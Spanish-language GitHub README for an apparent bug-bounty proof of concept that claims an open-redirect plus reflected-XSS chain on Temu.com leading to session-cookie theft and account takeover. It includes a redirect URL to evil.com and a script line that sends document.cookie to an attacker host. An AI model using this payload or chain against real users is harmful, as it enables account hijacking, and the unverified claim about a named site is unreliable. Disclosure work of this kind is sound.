 temu-vuln-hunter-pro, enfocado en mostrar la cadena de vulnerabilidades descubierta (XSS + Open Redirect) en Temu, ideal para GitHub y vinculado a un entorno de caza de recompensas (HackerOne):

# 🛡️ Temu Vulnerability Hunter Pro

🚨 **Proof of Concept: Encadenamiento Crítico - XSS Reflejado + Open Redirect en Temu.com**  
Este proyecto documenta y automatiza la explotación de una cadena de vulnerabilidades en Temu, combinando una redirección abierta y una inyección de scripts (XSS) para robar cookies de sesión y tomar control de cuentas.

---

## 📌 Descripción del Proyecto

`temu-vuln-hunter-pro` es una prueba de concepto profesional enfocada en demostrar cómo múltiples fallos de seguridad pueden combinarse para obtener un impacto crítico:

- 🧩 **Redirección Abierta (Open Redirect)**
- 💥 **XSS Reflejado**
- 🍪 **Robo de Cookies**
- 👤 **Toma de Cuenta Remota**

Este tipo de ataque encadenado permite que un atacante genere un solo enlace malicioso capaz de redirigir a un usuario a un payload XSS y así capturar su cookie de sesión.

---

## 🧪 Archivos Incluidos

📁 temu-vuln-hunter-pro
├── main.py # Script para automatizar y lanzar el PoC
├── payloads/
│ └── xss-openredirect.html # HTML con payload XSS
├── reports/
│ └── temu_xss_redirect_report.md # Informe profesional del hallazgo
├── screenshots/
│ └── poc1.png # Captura de pantalla del ataque exitoso
└── README.md # Este archivo



---

## 🚀 Ejecución del PoC

Asegúrate de tener Python 3 instalado. Luego:

git clone https://github.com/Jonathanjimenez123/temu-vuln-hunter-pro.git
cd temu-vuln-hunter-pro
python3 main.py
Esto abrirá el payload localmente y simulará la explotación para demostrar cómo se roba la cookie del usuario víctima.

💡 Concepto del Ataque
El atacante crea una URL con redirección abierta en Temu:

https://temu.com/redirect?to=https://evil.com/xss-openredirect.html
La víctima hace clic en ese enlace.

El navegador carga el archivo xss-openredirect.html, que contiene un script malicioso:

<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
Se roba la cookie de sesión y se envía al servidor del atacante.

El atacante reutiliza esa cookie y toma control de la cuenta de la víctima.

📸 Evidencia Visual

📄 Informe de Vulnerabilidad
Puedes leer el informe técnico detallado en reports/temu_xss_redirect_report.md, listo para ser enviado a HackerOne, Bugcrowd o el Google VRP en caso de participar en programas de recompensas.

⚠️ Descargo de Responsabilidad
Este proyecto ha sido creado con fines educativos y de responsible disclosure. No está diseñado para ser usado en actividades ilegales. El autor no se responsabiliza por su uso indebido.
Siempre reporta vulnerabilidades de forma ética y profesional.

📬 Contacto
Autor: Jonathan Jiménez

GitHub: @Jonathanjimenez123

Alias HackerOne: jimenez7@wearehackerone.com

Encabezado de Investigación: X-HackerOne-Investigación: jimenez7

⭐ Licencia
MIT © 2025 Jonathan Jiménez
